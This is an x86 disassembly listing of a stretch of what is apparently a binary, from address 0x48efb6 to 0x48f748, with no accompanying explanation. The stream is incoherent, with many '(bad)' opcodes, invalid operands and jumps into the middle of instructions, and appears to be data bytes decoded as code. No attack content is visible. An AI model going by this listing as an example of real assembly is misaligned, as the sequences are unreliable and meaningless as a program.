  48efb6:	or     eax,0xc91ef0ee
  48efbb:	aad    0xba
  48efbd:	pop    ss
  48efbe:	mov    ah,0x15
  48efc0:	test   BYTE PTR [edx],al
  48efc2:	cdq    
  48efc3:	mov    eax,0xc22437c2
  48efc8:	mov    edi,ebx
  48efca:	int    0x52
  48efcc:	stos   BYTE PTR es:[edi],al
  48efcd:	test   BYTE PTR [ebp-0x22],dh
  48efd0:	(bad)  
  48efd1:	push   ss
  48efd2:	sub    eax,edx
  48efd4:	ffreep st(0)
  48efd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48efd7:	inc    esi
  48efd8:	loope  0x48f04e
  48efda:	push   ebx
  48efdb:	inc    esp
  48efdc:	add    al,0xe1
  48efde:	mov    WORD PTR [ebp+ebp*8-0x15],ds
  48efe2:	aaa    
  48efe3:	inc    ecx
  48efe4:	cmp    dl,BYTE PTR [esi+0x1]
  48efe7:	cmp    eax,0x233602c2
  48efec:	push   edi
  48efed:	repnz add ah,BYTE PTR [ebx-0x4efcb1fd]
  48eff4:	fcom   QWORD PTR cs:[edi]
  48eff7:	mov    dl,BYTE PTR [ebx+0x72078b1e]
  48effd:	adc    DWORD PTR [esi+ebp*1+0x7d750f01],edi
  48f004:	jbe    0x48efb7
  48f006:	mov    ch,0x64
  48f008:	stc    
  48f009:	xor    eax,0x24ef149
  48f00e:	jmp    0x48efb4
  48f010:	push   esi
  48f011:	ja     0x48f077
  48f013:	mov    ds:0x14e2087,al
  48f018:	fist   WORD PTR [edx]
  48f01a:	add    ebp,DWORD PTR [edi+0x56e54679]
  48f020:	add    BYTE PTR [ecx],cl
  48f022:	and    DWORD PTR [edi+edi*8+0x0],ebp
  48f026:	js     0x48f058
  48f028:	mov    ds:0x41220e,al
  48f02d:	enter  0x625,0x9a
  48f031:	sub    DWORD PTR [esi+ebx*4-0x4a],edi
  48f035:	fld    DWORD PTR [ebx+0x1e21932d]
  48f03b:	inc    ecx
  48f03c:	adc    edi,esp
  48f03e:	sub    al,0x3e
  48f040:	int    0xe6
  48f042:	ror    DWORD PTR [ecx+edi*4],cl
  48f045:	and    al,0x8b
  48f047:	sub    BYTE PTR [ebp-0x7c],dh
  48f04a:	and    BYTE PTR [ebx+0x3269e7cd],bl
  48f050:	add    al,0xed
  48f052:	sub    edi,ebp
  48f054:	pop    ds
  48f055:	stos   DWORD PTR es:[edi],eax
  48f056:	and    ebx,DWORD PTR [edi+0x7d3669e7]
  48f05c:	daa    
  48f05d:	data16 jbe 0x48f084
  48f060:	mul    BYTE PTR [esi]
  48f062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f063:	fldcw  WORD PTR [esi+esi*1-0x21]
  48f067:	sub    ch,bh
  48f069:	push   ds
  48f06a:	popf   
  48f06b:	and    ch,BYTE PTR [edi+0x38]
  48f06e:	out    dx,eax
  48f06f:	jns    0x48f00f
  48f071:	pop    eax
  48f072:	js     0x48f08a
  48f074:	call   0x145fc13f
  48f079:	mov    ds,WORD PTR [edx-0x21]
  48f07c:	push   esp
  48f07d:	in     eax,dx
  48f07e:	add    eax,0x4a0d049
  48f083:	shr    BYTE PTR [ecx+0x38],0xa1
  48f087:	mov    al,0x41
  48f089:	pop    eax
  48f08a:	call   0xabfa:0x81088408
  48f091:	mov    al,ds:0xea4c287
  48f096:	mov    ?,WORD PTR [ecx+0x36]
  48f099:	dec    ebx
  48f09a:	clc    
  48f09b:	(bad)  
  48f09c:	mov    edi,0x7204fade
  48f0a1:	xor    edi,esi
  48f0a3:	fld    DWORD PTR [ebx+0xc7403e1]
  48f0a9:	sub    edx,ecx
  48f0ab:	mov    BYTE PTR [edi],al
  48f0ad:	test   BYTE PTR [edi-0x16a30005],ah
  48f0b3:	add    DWORD PTR [ebp-0xa],esi
  48f0b6:	mov    ecx,eax
  48f0b8:	shl    eax,0x8
  48f0bb:	add    eax,ecx
  48f0bd:	or     eax,0x5ef6ca10
  48f0c2:	and    al,0x98
  48f0c4:	(bad)  
  48f0c5:	js     0x48f13b
  48f0c7:	push   es
  48f0c8:	rep stos DWORD PTR es:[edi],eax
  48f0ca:	mov    al,0xa
  48f0cc:	dec    edi
  48f0cd:	jo     0x48f0e3
  48f0cf:	ds gs jmp 0x5e0:0xe0c35fc0
  48f0d8:	je     0x48f0e1
  48f0da:	adc    edx,DWORD PTR [eax]
  48f0dc:	push   ebp
  48f0dd:	test   DWORD PTR [ebx],0x200ea41b
  48f0e3:	xor    ebp,DWORD PTR [esi+0x6dfdd72b]
  48f0e9:	jge    0x48f102
  48f0eb:	loopne 0x48f127
  48f0ed:	mov    WORD PTR [edx+0x2],sp
  48f0f1:	ss dec cx
  48f0f4:	jne    0x48f0e4
  48f0f6:	xchg   DWORD PTR [eax],ebx
  48f0f8:	adc    ah,bh
  48f0fa:	xor    al,0x18
  48f0fc:	dec    ecx
  48f0fd:	je     0x48f114
  48f0ff:	cmp    al,0xf4
  48f101:	xchg   edx,eax
  48f102:	pop    es
  48f103:	shr    BYTE PTR [esi+0x7f],1
  48f106:	shl    edx,0x10
  48f109:	or     eax,edx
  48f10b:	shr    ecx,1
  48f10d:	mov    dl,0x13
  48f10f:	leave  
  48f110:	data16 or BYTE PTR [edi-0x5],bl
  48f114:	sar    dh,1
  48f116:	or     ebx,DWORD PTR [eax]
  48f118:	js     0x48f18e
  48f11a:	or     ebp,DWORD PTR [edx+0x2d]
  48f11d:	pop    edx
  48f11e:	jp     0x48f131
  48f120:	jl     0x48f18f
  48f122:	pusha  
  48f123:	xor    DWORD PTR [edi+esi*8-0x28],esi
  48f127:	push   esi
  48f128:	shl    bh,cl
  48f12a:	jne    0x48f155
  48f12c:	cld    
  48f12d:	sbb    ecx,DWORD PTR ds:0x576098e
  48f133:	add    edx,0x57
  48f136:	jmp    0x48f13b
  48f138:	cmp    dh,BYTE PTR [eax+0x3954cc8b]
  48f13e:	push   edx
  48f13f:	in     al,0x12
  48f141:	jbe    0x48f145
  48f143:	cmp    ch,ch
  48f145:	push   ds
  48f146:	dec    edx
  48f147:	or     cl,BYTE PTR [ebx+0x61c2a16]
  48f14d:	dec    ax
  48f14f:	mov    ebp,0xf13b1019
  48f154:	jb     0x48f140
  48f156:	sbb    ebp,DWORD PTR [ebx-0x14d424ff]
  48f15c:	adc    BYTE PTR [eax+0x75],bh
  48f15f:	or     ah,BYTE PTR [ecx+edi*2+0x6]
  48f163:	sbb    BYTE PTR [eax+0x1],bl
  48f166:	aaa    
  48f167:	lods   al,BYTE PTR ds:[esi]
  48f168:	or     ch,bl
  48f16a:	add    eax,0x8a36b24
  48f16f:	cmp    BYTE PTR [eax+0x5e],bh
  48f172:	and    al,al
  48f174:	test   al,0xa3
  48f176:	and    BYTE PTR [ebx-0x1],0x14
  48f17a:	clc    
  48f17b:	fst    QWORD PTR ds:0xf0328e08
  48f181:	pop    edx
  48f182:	push   cs
  48f183:	pop    eax
  48f184:	mov    ds:0x990cf3a,al
  48f189:	(bad)  
  48f18a:	mov    ds:0xd083dbf7,al
  48f18f:	add    BYTE PTR [esi],bl
  48f191:	(bad)  
  48f192:	sub    bh,dh
  48f194:	or     al,ah
  48f196:	jae    0x48f1f1
  48f198:	lods   al,BYTE PTR ds:[esi]
  48f199:	jle    0x48f1eb
  48f19b:	push   ebx
  48f19c:	adc    DWORD PTR [eax],0x792e5f32
  48f1a2:	cld    
  48f1a3:	mov    DWORD PTR [ebp+0xc],ebx
  48f1a6:	out    0x45,al
  48f1a8:	(bad)
  48f1ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f1ac:	rol    ecx,0xe
  48f1af:	add    esi,0x77
  48f1b2:	aad    0x72
  48f1b4:	cs int 0x41
  48f1b7:	add    esi,DWORD PTR [ebx-0x25]
  48f1ba:	jne    0x48f18b
  48f1bc:	aaa    
  48f1bd:	out    dx,al
  48f1be:	push   esp
  48f1bf:	push   es
  48f1c0:	(bad)  
  48f1c2:	sub    eax,ebp
  48f1c4:	jo     0x48f200
  48f1c6:	cmp    eax,0xfec754ee
  48f1cb:	mov    dh,0x58
  48f1cd:	js     0x48f229
  48f1cf:	fisubr WORD PTR [ebx+0x52]
  48f1d2:	add    al,0x6e
  48f1d4:	pop    ebp
  48f1d5:	pop    es
  48f1d6:	or     BYTE PTR [edx],cl
  48f1d8:	and    BYTE PTR [ecx],bh
  48f1da:	into   
  48f1db:	jg     0x48f1e7
  48f1dd:	jl     0x48f170
  48f1df:	pusha  
  48f1e0:	add    ch,BYTE PTR [esi]
  48f1e2:	mov    edx,0xf4037308
  48f1e7:	cwde   
  48f1e8:	fsubr  st(1),st
  48f1ea:	push   es
  48f1eb:	pop    edx
  48f1ec:	adc    al,0xf4
  48f1ee:	adc    BYTE PTR ds:0x91a8220,cl
  48f1f4:	xor    al,0x96
  48f1f6:	push   ss
  48f1f7:	imul   eax,DWORD PTR [ebp+0x11],0x6f
  48f1fb:	loopne 0x48f188
  48f1fd:	out    dx,al
  48f1fe:	les    edi,FWORD PTR [esi+ebx*4+0x2b157557]
  48f205:	icebp  
  48f206:	mov    bh,BYTE PTR [ebp-0x5fca47f]
  48f20c:	xor    ah,bh
  48f20e:	push   esi
  48f20f:	rol    BYTE PTR [ecx-0x351235e3],0xfe
  48f216:	add    eax,0x4264f39
  48f21b:	mov    edx,0x3f5da57e
  48f220:	or     bh,BYTE PTR [ebx+edx*2-0x3b]
  48f224:	mov    esi,0x21672612
  48f229:	jbe    0x48f26c
  48f22b:	and    DWORD PTR [eax],ebx
  48f22d:	pushf  
  48f22e:	in     al,0x7f
  48f230:	adc    al,0x83
  48f232:	in     al,dx
  48f233:	sbb    DWORD PTR [edx-0x11],ecx
  48f236:	fimul  DWORD PTR fs:[edi]
  48f239:	cmp    BYTE PTR [ebp-0x10],cl
  48f23c:	mov    ecx,DWORD PTR [ecx-0x5970f738]
  48f242:	inc    ebx
  48f243:	adc    eax,0xb6fc0010
  48f248:	jge    0x48f25a
  48f24a:	push   edx
  48f24b:	mov    cl,0x7f
  48f24d:	leave  
  48f24e:	fst    QWORD PTR [edi-0x3ef244f]
  48f254:	and    DWORD PTR [ebp+0x4035959],ebp
  48f25a:	mov    ebp,0xd0b4253f
  48f25f:	or     al,0xa5
  48f261:	fldcw  WORD PTR [ebx]
  48f263:	push   eax
  48f264:	or     al,ch
  48f266:	scas   al,BYTE PTR es:[edi]
  48f267:	in     al,0x94
  48f269:	pop    es
  48f26a:	add    DWORD PTR [eax-0x49fb9983],edi
  48f270:	xchg   ebx,eax
  48f271:	jo     0x48f2e9
  48f273:	test   BYTE PTR [edi],ah
  48f275:	push   es
  48f276:	push   0x483b408
  48f27b:	adc    DWORD PTR [ebp-0x73],0xa2143c90
  48f282:	jmp    FWORD PTR [esi-0x3c]
  48f285:	jne    0x48f26c
  48f287:	cmp    al,bl
  48f289:	pop    es
  48f28a:	clc    
  48f28b:	cmp    ax,WORD PTR [edx]
  48f28e:	xchg   BYTE PTR [edx+edi*4+0x8],bl
  48f292:	add    al,0x68
  48f294:	xlat   BYTE PTR ds:[ebx]
  48f295:	cmp    al,0xe6
  48f297:	sub    BYTE PTR [edx+ecx*1],al
  48f29a:	add    bl,dl
  48f29c:	and    DWORD PTR [ebp+0x11],esi
  48f29f:	clc    
  48f2a0:	and    BYTE PTR [ebx+0x57],dl
  48f2a3:	fadd   DWORD PTR [edi]
  48f2a5:	sub    BYTE PTR [ecx+0x41],al
  48f2a8:	inc    edx
  48f2a9:	mov    esi,0xa2a04274
  48f2ae:	enter  0x666a,0x39
  48f2b2:	out    0x75,al
  48f2b4:	out    dx,eax
  48f2b5:	sub    al,0xb0
  48f2b7:	push   ds
  48f2b8:	scas   eax,DWORD PTR es:[edi]
  48f2b9:	jmp    0x48f323
  48f2bb:	rol    BYTE PTR [edx],1
  48f2bd:	in     al,0x56
  48f2bf:	xchg   edi,eax
  48f2c1:	cmp    eax,0x8de0b501
  48f2c6:	inc    ebp
  48f2c7:	dec    edx
  48f2c8:	dec    edi
  48f2c9:	add    dh,BYTE PTR [ebp-0x4bebcf3e]
  48f2cf:	in     al,dx
  48f2d0:	inc    edx
  48f2d1:	sbb    eax,0xdf7843c2
  48f2d6:	ds clc 
  48f2d8:	xor    DWORD PTR [ebp+0x5a],0xc8e9812
  48f2df:	adc    al,0x78
  48f2e1:	imul   esi,eax,0xe03e1fb5
  48f2e7:	mov    BYTE PTR [eax],bl
  48f2e9:	dec    DWORD PTR [eax]
  48f2eb:	jmp    0x48f342
  48f2ed:	push   ebx
  48f2ee:	popf   
  48f2ef:	xchg   esp,eax
  48f2f0:	pushf  
  48f2f1:	adc    bh,BYTE PTR [ebx-0x61]
  48f2f4:	cmp    BYTE PTR [eax+0x7],bh
  48f2f7:	xor    eax,0xb020622f
  48f2fc:	pop    eax
  48f2fd:	and    al,0x1d
  48f2ff:	adc    DWORD PTR [eax],esi
  48f301:	jo     0x48f331
  48f303:	or     dl,BYTE PTR [esi+0x40]
  48f306:	cmp    edx,edx
  48f308:	js     0x48f2c8
  48f30a:	add    DWORD PTR [edx],esp
  48f30c:	loope  0x48f2a3
  48f30e:	and    eax,0xadc5291a
  48f313:	test   BYTE PTR [edi],dl
  48f315:	test   al,0x24
  48f317:	pop    ss
  48f318:	or     esi,DWORD PTR [edi+ebx*8+0x56]
  48f31c:	jl     0x48f38e
  48f31e:	and    DWORD PTR es:[eax+0x14],ecx
  48f322:	aad    0x75
  48f324:	inc    ecx
  48f325:	shl    BYTE PTR [ecx+0x11],1
  48f328:	xchg   ebx,eax
  48f329:	ror    DWORD PTR [ecx-0x303de9bc],cl
  48f32f:	xchg   ebx,eax
  48f330:	jb     0x48f371
  48f332:	ret    
  48f333:	jmp    0x48f36d
  48f335:	add    al,0xb
  48f337:	xchg   ebx,eax
  48f338:	pusha  
  48f339:	adc    ah,ah
  48f33b:	fstp   QWORD PTR [edi]
  48f33d:	dec    esp
  48f33e:	ret    0x3220
  48f341:	pop    es
  48f342:	fsub   st(4),st
  48f344:	xor    BYTE PTR [ecx],cl
  48f346:	scas   al,BYTE PTR es:[edi]
  48f347:	retf   
  48f348:	ins    DWORD PTR es:[edi],dx
  48f349:	jle    0x48f2f5
  48f34b:	out    0x3,eax
  48f34d:	rol    DWORD PTR ds:0xd679c8c8,0xd3
  48f354:	sbb    DWORD PTR [eax+0x12],ebp
  48f357:	into   
  48f358:	cmp    ebp,0x90684a63
  48f35e:	and    BYTE PTR [ebx+0x41cc9a0a],ah
  48f364:	xchg   BYTE PTR [edi],al
  48f366:	ret    
  48f367:	adc    ebp,DWORD PTR [edx-0x1]
  48f36a:	xchg   ebp,eax
  48f36b:	sub    ah,BYTE PTR [ecx+0x70]
  48f36e:	and    esi,DWORD PTR [esi]
  48f370:	cwde   
  48f371:	or     eax,0xe962a80f
  48f376:	push   0x2a
  48f378:	cmp    esi,DWORD PTR [esp+esi*2+0x43]
  48f37c:	cmp    eax,DWORD PTR [eax+0x3a]
  48f37f:	or     DWORD PTR [edx-0x55d42e89],edi
  48f385:	pop    ebx
  48f386:	jne    0x48f30b
  48f388:	ret    
  48f389:	or     al,0x9b
  48f38b:	sbb    DWORD PTR [eax],edx
  48f38d:	movntps XMMWORD PTR [ebp-0x5e],xmm5
  48f391:	sti    
  48f392:	push   cs
  48f393:	ret    0x2b08
  48f396:	fidiv  DWORD PTR [ebp+0x9]
  48f399:	aam    0x40
  48f39b:	adc    al,0x75
  48f39d:	out    0x41,eax
  48f39f:	inc    ebx
  48f3a0:	mov    eax,ds:0x48396aa9
  48f3a5:	adc    al,0x7
  48f3a7:	pop    ss
  48f3a8:	or     ah,BYTE PTR [esi+0x5d04ad03]
  48f3ae:	retf   
  48f3af:	(bad)  
  48f3b0:	pop    ebx
  48f3b1:	mov    al,0x2
  48f3b3:	(bad)
  48f3b7:	clc    
  48f3b8:	sbb    DWORD PTR [ecx],eax
  48f3ba:	fcomp  st(7)
  48f3bc:	mov    dl,0x1f
  48f3be:	adc    BYTE PTR [edi],ch
  48f3c0:	(bad)  
  48f3c1:	test   ecx,0x8a2474bc
  48f3c7:	add    DWORD PTR [esi+0x4956cfbf],ecx
  48f3cd:	mov    BYTE PTR [esi+ecx*2+0x21],dh
  48f3d1:	jne    0x48f3c2
  48f3d3:	add    eax,0xa48d0c00
  48f3d8:	and    al,0xf1
  48f3da:	stos   DWORD PTR es:[edi],eax
  48f3db:	(bad)  
  48f3dc:	and    eax,0xffba018b
  48f3e1:	(bad)  
  48f3e2:	(bad)  
  48f3e3:	in     al,0xd0
  48f3e5:	xor    eax,0xffffffff
  48f3e8:	xor    eax,edx
  48f3ea:	idiv   bl
  48f3ec:	ins    DWORD PTR es:[edi],dx
  48f3ed:	mov    bh,0xfa
  48f3ef:	test   eax,0x74819a00
  48f3f4:	call   0x73453584
  48f3f9:	xor    al,BYTE PTR [esp+eiz*8+0x1113b58c]
  48f400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f401:	test   eax,0xe0cf086
  48f406:	je     0x48f3c8
  48f408:	sbb    DWORD PTR ds:0x20cd0234,eax
  48f40e:	retf   
  48f40f:	jb     0x48f3d9
  48f411:	and    DWORD PTR [ebp-0x1ed3c14],ebp
  48f417:	std    
  48f418:	cld    
  48f419:	cmc    
  48f41a:	aas    
  48f41b:	loopne 0x48f47d
  48f41d:	cmp    esp,DWORD PTR [eax-0x7d]
  48f420:	sti    
  48f421:	loopne 0x48f49a
  48f423:	outs   dx,DWORD PTR ds:[esi]
  48f424:	push   esi
  48f425:	push   edi
  48f426:	pop    esp
  48f427:	mov    ebp,DWORD PTR [eax+0x0]
  48f42a:	push   0x60181a6e
  48f42f:	and    BYTE PTR [eax+eiz*1+0x55],ch
  48f433:	push   0x1e
  48f435:	push   ebx
  48f436:	xor    eax,0x5181c245
  48f43b:	push   esi
  48f43c:	jle    0x48f419
  48f43e:	ret    
  48f43f:	add    DWORD PTR [esi+ebp*2],ebx
  48f442:	or     BYTE PTR [ebx+eiz*4-0x60],cl
  48f446:	or     al,BYTE PTR [edi-0x2e]
  48f449:	fnsave ds:0x5815ff5d
  48f44f:	jo     0x48f449
  48f451:	push   ebp
  48f452:	outs   dx,DWORD PTR ds:[esi]
  48f453:	loopne 0x48f4cc
  48f455:	xor    al,0x26
  48f457:	push   0xc
  48f459:	pop    esi
  48f45a:	cmp    DWORD PTR ds:0xfb532466,eax
  48f460:	loop   0x48f4d9
  48f462:	or     DWORD PTR [edi+0x75],esp
  48f465:	test   eax,0x89c707eb
  48f46a:	xor    BYTE PTR ds:0x60247b62,cl
  48f470:	push   ss
  48f471:	jmp    0x48f487
  48f473:	inc    ecx
  48f474:	cwde   
  48f475:	cmp    al,bl
  48f477:	mov    ecx,0x6aaa0cfd
  48f47c:	loope  0x48f4bf
  48f47e:	or     BYTE PTR [esi+0x8247c5e],bh
  48f484:	jmp    0x48f4f4
  48f486:	sti    
  48f487:	xchg   ebx,eax
  48f488:	push   edi
  48f489:	jo     0x48f4cc
  48f48b:	push   es
  48f48c:	mov    ecx,0x3e3d1361
  48f491:	leave  
  48f492:	enter  0xd073,0x3f
  48f496:	and    ebx,DWORD PTR [edx]
  48f498:	push   cs
  48f499:	out    0xe6,al
  48f49b:	push   esi
  48f49c:	xor    eax,0x80dd279
  48f4a1:	(bad)  
  48f4a2:	jmp    0x48f4ac
  48f4a4:	std    
  48f4a5:	jmp    0x48f4aa
  48f4a7:	adc    eax,0x210eb7ca
  48f4ac:	or     al,0xc7
  48f4ae:	sbb    eax,0x66d6118a
  48f4b3:	out    dx,eax
  48f4b4:	std    
  48f4b5:	retw   0x1788
  48f4b9:	push   0x5ebead1
  48f4be:	mov    DWORD PTR [esp+eax*1],ebx
  48f4c1:	xlat   BYTE PTR ds:[ebx]
  48f4c2:	jmp    0xe4afeb02
  48f4c7:	fisttp DWORD PTR [ebx+0x62e1df11]
  48f4cd:	xor    al,0x84
  48f4cf:	cmp    BYTE PTR [ebp-0x12],0xbb
  48f4d3:	push   ds
  48f4d4:	daa    
  48f4d5:	test   edx,0xdd0f12db
  48f4db:	(bad)  
  48f4dc:	jo     0x48f551
  48f4de:	mov    ebx,DWORD PTR [eax+0x1166e97d]
  48f4e4:	(bad)  
  48f4e5:	in     al,dx
  48f4e6:	sbb    DWORD PTR [edx+0x1],ebp
  48f4e9:	mov    dh,0x6e
  48f4eb:	sub    ecx,DWORD PTR [eax+0xd35cb0f]
  48f4f1:	mov    ds:0x462d2e2a,eax
  48f4f6:	mov    ebx,0x940183f8
  48f4fb:	xchg   ebp,eax
  48f4fc:	dec    ebp
  48f4fd:	adc    al,0x53
  48f4ff:	pop    ebp
  48f500:	pop    edx
  48f501:	pop    ss
  48f502:	ret    0x8fe
  48f505:	aaa    
  48f506:	mov    edi,0x1abe0556
  48f50b:	xor    DWORD PTR [ecx-0x77],ebx
  48f50e:	push   es
  48f50f:	pop    esi
  48f510:	mov    eax,ds:0x5602b823
  48f515:	(bad)  
  48f516:	mov    WORD PTR [esi+ebx*1+0x1287137e],gs
  48f51d:	(bad)  
  48f51e:	sub    BYTE PTR [ebp+0x6a748d47],bh
  48f524:	adc    BYTE PTR [ebx-0x1faa3780],cl
  48f52a:	dec    edi
  48f52b:	pop    es
  48f52c:	adc    DWORD PTR [eax+0x4e08348],edi
  48f532:	rol    esp,cl
  48f534:	mov    ?,WORD PTR [eax-0x7a8a9896]
  48f53a:	or     eax,0xf3b01d38
  48f53f:	add    al,0x34
  48f541:	pop    eax
  48f542:	inc    ecx
  48f543:	loopne 0x48f54e
  48f545:	mov    dh,0x82
  48f547:	adc    ah,ah
  48f549:	daa    
  48f54a:	jle    0x48f527
  48f54c:	xor    edx,edx
  48f54e:	test   eax,0x863849da
  48f553:	cmp    al,0x3b
  48f555:	retf   0x84c0
  48f558:	addr16 clc 
  48f55a:	aas    
  48f55b:	rcl    BYTE PTR [edx+0x3b],0xfa
  48f55f:	jne    0x48f568
  48f561:	cmp    DWORD PTR [ebp+0x10],edx
  48f564:	jne    0x48f5de
  48f566:	jl     0x48f574
  48f568:	xor    al,0x57
  48f56a:	out    dx,al
  48f56b:	fidiv  DWORD PTR [ecx+esi*2+0x8]
  48f56f:	adc    al,0x21
  48f571:	sbb    BYTE PTR [ebp+0x67],dh
  48f574:	sbb    BYTE PTR [eax+eiz*2+0x1c],dh
  48f578:	imul   ebp,DWORD PTR [esi+0x57],0x567520ae
  48f57f:	and    BYTE PTR [edi+ecx*2+0x8],dh
  48f583:	and    al,0x75
  48f585:	inc    ebp
  48f586:	sub    BYTE PTR [edi],ch
  48f588:	mov    esp,0x8bc887e9
  48f58d:	icebp  
  48f58e:	enter  0x7416,0x8
  48f592:	dec    eax
  48f593:	es sub ah,ch
  48f596:	data16 loope 0x48f55b
  48f599:	ja     0x48f58e
  48f59b:	inc    eax
  48f59c:	cmp    dh,BYTE PTR [ebp+0x39]
  48f59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f5a0:	mov    ds:0xef510bf,al
  48f5a5:	sbb    al,BYTE PTR [ebx]
  48f5a7:	jb     0x514b53ce
  48f5ad:	push   0xffffffff
  48f5af:	loope  0x48f5ba
  48f5b1:	into   
  48f5b2:	stos   DWORD PTR es:[edi],eax
  48f5b3:	push   edi
  48f5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f5b5:	mov    gs,WORD PTR [edx+eax*1]
  48f5b8:	push   esp
  48f5b9:	mov    DWORD PTR [ecx+0x4c26ee84],edi
  48f5bf:	into   
  48f5c0:	jmp    0x48f5dc
  48f5c2:	mov    DWORD PTR [ebx+0x3de15d08],edi
  48f5c8:	ror    BYTE PTR [eax-0x4e],cl
  48f5cb:	sub    DWORD PTR [eax+esi*2-0x64f86dfb],ebx
  48f5d2:	popf   
  48f5d3:	and    DWORD PTR [esp+esi*2+0x33],edi
  48f5d7:	call   0x7e78:0x5474aaba
  48f5de:	pop    ss
  48f5df:	push   ebx
  48f5e0:	pop    eax
  48f5e1:	das    
  48f5e2:	je     0x48f5f4
  48f5e4:	or     bl,BYTE PTR [esp+esi*2+0xa]
  48f5e8:	cs inc ebx
  48f5ea:	lods   al,BYTE PTR ds:[esi]
  48f5eb:	and    BYTE PTR ds:0x22de8b1e,ch
  48f5f1:	adc    bh,BYTE PTR ds:0xe00adb78
  48f5f7:	inc    esi
  48f5f8:	jne    0x48f5d6
  48f5fa:	je     0x48f628
  48f5fc:	jbe    0x48f672
  48f5fe:	and    bl,dh
  48f600:	add    ch,BYTE PTR [edx+edx*1+0x76]
  48f604:	outs   dx,BYTE PTR ds:[esi]
  48f605:	sar    eax,1
  48f607:	xchg   BYTE PTR [eax],bl
  48f609:	jbe    0xab29ab0
  48f60f:	fcom   QWORD PTR [eax-0x8]
  48f612:	adc    ch,bh
  48f614:	mov    DWORD PTR [esi+0x45],esi
  48f617:	ret    0xb233
  48f61a:	jmp    0x48f616
  48f61c:	adc    al,0xb4
  48f61e:	fisub  DWORD PTR [esp+ecx*1]
  48f621:	(bad)  
  48f622:	fwait
  48f623:	(bad)  
  48f624:	cmp    BYTE PTR [ebx],bh
  48f626:	fidiv  DWORD PTR [edi+eax*2+0x3b]
  48f62a:	fnstenv [edx+0x43]
  48f62d:	aam    0x58
  48f62f:	iretw  
  48f631:	or     al,dh
  48f633:	ret    
  48f634:	jg     0x48f656
  48f636:	jbe    0x48f69f
  48f638:	ja     0x48f656
  48f63a:	sti    
  48f63b:	inc    DWORD PTR [ebx-0x5828589]
  48f641:	je     0x48f688
  48f643:	sub    esi,ebx
  48f645:	sar    esi,1
  48f647:	cmp    DWORD PTR [ebp+0x28],esi
  48f64a:	jbe    0x48f691
  48f64c:	push   esi
  48f64d:	push   ebx
  48f64e:	mov    ebx,0xa41dddcd
  48f653:	and    al,0xeb
  48f655:	sub    eax,DWORD PTR [ebp+0x3df12b1a]
  48f65b:	and    BYTE PTR [esi],0xe6
  48f65e:	rcr    dh,cl
  48f660:	xchg   edx,eax
  48f661:	push   esi
  48f662:	jnp    0x48f64e
  48f664:	and    al,0xc9
  48f666:	lock je 0x48f602
  48f669:	mov    BYTE PTR [eax],cl
  48f66b:	add    DWORD PTR [ecx],ebp
  48f66d:	or     al,0xa
  48f66f:	xor    dl,dl
  48f671:	call   0x30f6:0x3276fcf6
  48f678:	and    BYTE PTR [eax+ebx*1],dl
  48f67b:	and    eax,DWORD PTR [edi+0x201c1c8c]
  48f681:	and    al,0x28
  48f683:	jmp    0x1375:0xa2262b1f
  48f68a:	std    
  48f68b:	push   0x16
  48f68d:	pop    esi
  48f68e:	mov    BYTE PTR [esi-0x49],ah
  48f691:	lahf   
  48f692:	lea    esp,[ecx]
  48f694:	mov    eax,esi
  48f696:	jmp    0x48f636
  48f698:	inc    eax
  48f699:	cld    
  48f69a:	jne    0x48f684
  48f69c:	das    
  48f69d:	and    dl,BYTE PTR [esi+edi*8]
  48f6a0:	test   BYTE PTR [eax+0x4d],bl
  48f6a3:	ss jmp 0x48f631
  48f6a6:	mov    ds:0x1bd9f718,eax
  48f6ab:	leave  
  48f6ac:	mov    eax,0x147c46b4
  48f6b1:	aam    0x23
  48f6b3:	enter  0x18d6,0x22
  48f6b7:	adc    al,0x83
  48f6b9:	ins    DWORD PTR es:[edi],dx
  48f6ba:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  48f6bc:	sbb    BYTE PTR [edx],dl
  48f6be:	dec    esi
  48f6bf:	sbb    DWORD PTR [esp],esi
  48f6c2:	dec    esi
  48f6c3:	les    edx,FWORD PTR [edx]
  48f6c5:	adc    BYTE PTR [eax+edx*2+0x3a],dl
  48f6c9:	adc    al,0xa8
  48f6cb:	retf   0x3b50
  48f6ce:	daa    
  48f6cf:	std    
  48f6d0:	adc    eax,0x8484053e
  48f6d5:	in     eax,0xc2
  48f6d7:	mov    cx,WORD PTR [edx]
  48f6da:	mov    ah,0xfa
  48f6dc:	ret    0x90d
  48f6df:	xor    eax,0x1402ea83
  48f6e4:	push   esi
  48f6e5:	or     dh,BYTE PTR [eax+esi*4]
  48f6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f6e9:	dec    esi
  48f6ea:	popf   
  48f6eb:	push   cs
  48f6ec:	loopne 0x48f74a
  48f6ee:	pusha  
  48f6ef:	loope  0x48f6f5
  48f6f1:	inc    eax
  48f6f2:	cmp    ebx,DWORD PTR [edx+0x6a]
  48f6f5:	or     eax,DWORD PTR [ecx+ebp*4-0x19aed0bd]
  48f6fc:	pop    es
  48f6fd:	or     dh,BYTE PTR [edi]
  48f6ff:	out    dx,eax
  48f700:	jo     0x48f683
  48f702:	sbb    eax,DWORD PTR [eax]
  48f704:	out    0xff,al
  48f706:	fs (bad) 
  48f708:	outs   dx,BYTE PTR ds:[esi]
  48f709:	push   ss
  48f70a:	aam    0xc2
  48f70c:	mov    ?,ecx
  48f70e:	mov    esp,0x20680c46
  48f713:	jo     0x48f758
  48f715:	xor    cl,BYTE PTR [esp+eiz*2+0x40]
  48f719:	sbb    eax,0xa95e170
  48f71e:	xchg   ebp,eax
  48f71f:	sar    BYTE PTR [ebx],0xc6
  48f722:	cmp    eax,0x8007275f
  48f727:	call   DWORD PTR [edx]
  48f729:	inc    ebx
  48f72a:	xchg   esi,eax
  48f72b:	push   0x20
  48f72d:	pop    ebx
  48f72e:	add    eax,ebx
  48f730:	push   eax
  48f731:	add    bh,BYTE PTR [ebx+0x44cc9267]
  48f737:	scas   al,BYTE PTR es:[edi]
  48f738:	xor    ch,BYTE PTR ds:0xf7b60e26
  48f73e:	and    eax,0x591290f4
  48f743:	les    ecx,FWORD PTR [eax+edx*2]
  48f746:	push   esi
  48f747:	iret   
  48f748:	das    
